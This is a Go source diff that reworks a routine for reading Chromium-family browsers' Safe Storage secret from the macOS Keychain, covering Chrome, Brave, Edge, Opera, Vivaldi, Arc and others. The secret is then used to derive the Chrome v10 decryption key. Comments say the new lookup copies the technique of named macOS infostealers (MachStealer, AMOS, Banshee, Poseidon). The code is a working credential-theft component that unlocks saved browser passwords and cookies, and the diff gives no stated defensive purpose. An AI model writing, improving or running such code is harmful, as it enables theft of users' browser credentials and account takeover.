@@ -61,11 +61,34 @@ func loginKeychainPath() string {
 	return filepath.Join(home, "Library", "Keychains", "login.keychain-db")
 }
 
+func keychainAccountsForBrowser(browserName string) []string {
+	switch browserName {
+	case "Chrome", "Chrome Beta", "Chrome Canary":
+		return []string{"Chrome"}
+	case "Brave":
+		return []string{"Brave"}
+	case "Chromium":
+		return []string{"Chromium"}
+	case "Edge":
+		return []string{"Microsoft Edge", "Edge"}
+	case "Opera", "Opera GX":
+		return []string{"Opera", "Opera GX"}
+	case "Vivaldi":
+		return []string{"Vivaldi"}
+	case "Arc":
+		return []string{"Arc"}
+	default:
+		return []string{browserName}
+	}
+}
+
+// getKeychainPassword reads Chromium Safe Storage secret from macOS Keychain.
+// MachStealer/AMOS/Banshee use: security find-generic-password -wa "Chrome"
+// (-w stdout, -a account) — NOT the service name as the -a argument.
 func getKeychainPassword(browserName string) (string, error) {
 	service := chromeKeychainService(browserName)
 	loginKC := loginKeychainPath()
-
-	accounts := []string{browserName, "Chrome", "Chromium", "Microsoft Edge", "Brave Browser", ""}
+	accounts := keychainAccountsForBrowser(browserName)
 
 	type attempt struct {
 		label string
@@ -74,43 +97,31 @@ func getKeychainPassword(browserName string) (string, error) {
 
 	var attempts []attempt
 	for _, account := range accounts {
-		base := []string{"find-generic-password", "-s", service}
-		if account != "" {
-			base = append(base, "-a", account)
-		}
-		base = append(base, "-w")
-
+		// MachStealer / Poseidon / Banshee primary method
 		attempts = append(attempts, attempt{
-			label: fmt.Sprintf("service=%s account=%q default-keychain", service, account),
-			args:  append([]string{}, base...),
+			label: fmt.Sprintf("MachStealer -wa %q", account),
+			args:  []string{"find-generic-password", "-wa", account},
+		})
+		// Explicit service + account (Chrome Safe Storage / Brave Safe Storage, etc.)
+		attempts = append(attempts, attempt{
+			label: fmt.Sprintf("service=%q account=%q", service, account),
+			args:  []string{"find-generic-password", "-s", service, "-a", account, "-w"},
 		})
 		if loginKC != "" {
 			attempts = append(attempts, attempt{
-				label: fmt.Sprintf("service=%s account=%q login-keychain", service, account),
-				args:  append(append([]string{}, base...), loginKC),
+				label: fmt.Sprintf("service=%q account=%q login-keychain-db", service, account),
+				args:  []string{"find-generic-password", "-s", service, "-a", account, "-w", loginKC},
 			})
 		}
-		attempts = append(attempts, attempt{
-			label: fmt.Sprintf("service=%s account=%q login-keychain-name", service, account),
-			args: func() []string {
-				args := []string{"find-generic-password", "-l", "login.keychain", "-s", service, "-w"}
-				if account != "" {
-					args = insertAccountFlag(args, account)
-				}
-				return args
-			}(),
-		})
 	}
 
 	var lastErr error
 	for _, attempt := range attempts {
-		cmd := exec.Command("security", attempt.args...)
-		out, err := cmd.Output()
+		password, err := runSecurityPasswordLookup(attempt.args)
 		if err != nil {
 			lastErr = err
 			continue
 		}
-		password := strings.TrimSpace(string(out))
 		if password != "" {
 			logf("keychain OK for %s via %s", browserName, attempt.label)
 			return password, nil
@@ -120,19 +131,24 @@ func getKeychainPassword(browserName string) (string, error) {
 	if lastErr == nil {
 		lastErr = fmt.Errorf("empty keychain password")
 	}
-	return "", fmt.Errorf("keychain lookup failed for %s: %w", service, lastErr)
+	return "", fmt.Errorf("keychain lookup failed for %s (%s): %w", browserName, service, lastErr)
 }
 
-func insertAccountFlag(args []string, account string) []string {
-	out := make([]string, 0, len(args)+2)
-	out = append(out, args[0])
-	for i := 1; i < len(args); i++ {
-		if args[i] == "-s" {
-			out = append(out, "-a", account)
+func runSecurityPasswordLookup(args []string) (string, error) {
+	cmd := exec.Command("security", args...)
+	var stdout, stderr strings.Builder
+	cmd.Stdout = &stdout
+	cmd.Stderr = &stderr
+	if err := cmd.Run(); err != nil {
+		if msg := strings.TrimSpace(stderr.String()); msg != "" {
+			return "", fmt.Errorf("%w: %s", err, msg)
 		}
-		out = append(out, args[i])
+		return "", err
 	}
-	return out
+	if strings.Contains(stderr.String(), "could not be found") {
+		return "", fmt.Errorf("could not be found")
+	}
+	return strings.TrimSpace(stdout.String()), nil
 }
 
 func deriveChromeV10Key(password string) []byte {
